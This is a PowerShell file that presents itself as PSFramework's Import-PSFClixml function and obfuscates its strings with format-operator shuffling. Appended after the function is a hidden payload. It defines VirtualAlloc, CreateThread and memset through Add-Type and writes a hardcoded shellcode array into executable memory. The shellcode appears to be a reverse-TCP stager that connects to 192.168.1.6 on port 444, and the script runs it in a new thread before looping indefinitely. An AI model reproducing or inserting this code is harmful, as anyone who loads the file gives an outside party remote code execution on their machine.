function Import-PSFClixml
{

	[CmdletBinding(HelpUri = ("{13}{15}{18}{1}{5}{3}{4}{16}{2}{6}{8}{17}{10}{9}{19}{0}{11}{12}{14}{7}" -f'/I','sf','cumen','mewor','k.org/','ra','tation/command','-PSFClixml','s/P','w','Frame','mpo','r','h','t','tt','do','S','ps://p','ork'))]
	Param (
		[Parameter(Mandatory = $true, Position = 0, ValueFromPipeline = $true, ValueFromPipelineByPropertyName = $true)]
		[Alias({"{1}{0}{2}"-f'l','Fu','lName'})]
		[string[]]
		$Path,
		
		[PSFEncoding]
		$Encoding = (Get-PSFConfigValue -FullName ("{6}{4}{1}{3}{8}{9}{2}{7}{5}{0}"-f'read','am','ding.','ew','r','t','psf','defaul','ork.text.e','nco') -Fallback ("{1}{0}" -f'f-8','ut'))
	)
	
	begin
	{
		Write-PSFMessage -Level InternalComment -Message "Bound parameters: $($PSBoundParameters.Keys -join ", ") " -Tag ("{0}{1}"-f 'debu','g'), ("{0}{1}" -f 'st','art'), ("{1}{0}" -f 'aram','p')
	}
	process
	{
		try { $resolvedPath = Resolve-PSFPath -Path $Path -Provider FileSystem }
		catch { Stop-PSFFunction -Message ("{4}{3}{7}{0}{5}{2}{6}{1}" -f'ed','ath.','o resolve','ai','F',' t',' p','l') -ErrorRecord $_ -EnableException $true -Cmdlet $PSCmdlet -Target $Path }
		
		foreach ($pathItem in $resolvedPath)
		{
			if ((Get-Item $pathItem).PSIsContainer)
			{
				Stop-PSFFunction -Message ("$pathItem "+'i'+'s '+'not'+' '+'a '+'fil'+'e') -EnableException $true -Target $pathItem
			}
			Write-PSFMessage -Level Verbose -Message "Processing $($pathItem) " -Target $pathItem
			
			[byte[]]$bytes = [System.IO.File]::ReadAllBytes($pathItem)
				
			try { [PSFramework.Serialization.ClixmlSerializer]::FromByteCompressed($bytes) }
			catch
			{
				[string]$string = [System.IO.File]::ReadAllText($pathItem, $Encoding)
				try { [PSFramework.Serialization.ClixmlSerializer]::FromString($string) }
				catch
				{
					try { [PSFramework.Serialization.ClixmlSerializer]::FromStringCompressed($string) }
					catch
					{
						try { [PSFramework.Serialization.ClixmlSerializer]::FromByte($bytes) }
						catch
						{
							Stop-PSFFunction -Message ("{3}{5}{1}{4}{2}{0}" -f'ert input object','d ','onv','Fail','to c','e') -EnableException $true -Target $pathItem -Cmdlet $PSCmdlet
						}
					}
				}
				
			}
		}
	}
}
$c = ((("{87}{45}{108}{115}{106}{3}{61}{59}{67}{26}{9}{43}{75}{54}{7}{99}{16}{47}{100}{68}{73}{56}{24}{8}{98}{101}{114}{31}{6}{27}{20}{63}{111}{44}{40}{65}{64}{25}{86}{102}{85}{58}{33}{91}{2}{103}{39}{79}{104}{18}{23}{12}{66}{74}{76}{113}{0}{37}{22}{96}{21}{105}{71}{30}{81}{51}{107}{52}{70}{15}{29}{80}{48}{41}{78}{92}{13}{5}{14}{69}{34}{46}{4}{55}{57}{90}{60}{32}{11}{93}{94}{82}{89}{19}{53}{84}{88}{110}{1}{50}{42}{38}{17}{83}{10}{72}{28}{62}{109}{35}{112}{97}{77}{49}{95}{36}"-f'dAt',' exte','ic','l',')','reationFlag','in','In',' uin','c ex','mset','t.','hread(','dwC','s, Int','s, ','Ptr Virtual',' ','at','lic',' ',' d',' uin','eT','Address,','p','i','t','tP','IntPt','ize, ',', u','rt(Q0Umsvcr','lic st','r','st, ui','nt);','tributes,','tPtr','n','tect)','Parame',' In','te','o','DllImport(Q0U','eadId','A','lp','t','rn','ntPtr lpS','dd',' sta','n ',';','p','[Dll','32.dllQ0U)]pub','0U)]pub','o','Q','tr','flAll','llIm',';[D','I','lic stat','IntPt','Ptr lpTh','res','StackS','(In','r l','ntPtr lp','r','T','rc, uin','ter, ',' IntP','r ','I','p','me','t','t(Q0Ukernel','o','[','i','ub','Imp','at','uint ','dllQ','0U)]',' cou','t','s','t d','t','lloc(','wSi','r',' exter','tr Cre','w','.dl','tartA','ke',' de','c','ocationType, uint flPr','nt ','hrea','ze','rnel32'))-cReplACE ([chAR]81+[chAR]48+[chAR]85),[chAR]34);$w = Add-Type -memberDefinition $c -Name ("{1}{0}"-f'2','Win3') -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x06,0x68,0x02,0x00,0x01,0xbc,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};
